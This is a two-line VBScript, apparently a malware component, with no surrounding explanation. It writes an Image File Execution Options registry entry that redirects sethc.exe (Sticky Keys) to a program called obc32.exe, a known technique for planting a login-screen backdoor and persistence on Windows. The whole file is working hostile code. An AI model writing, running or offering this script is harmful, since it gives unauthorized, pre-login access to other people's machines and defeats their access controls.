Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\debugger",WScript.CreateObject("WScript.shell").ExpandEnvironmentStrings("%SystemRoot%")&"\system32\obc32.exe","REG_SZ"

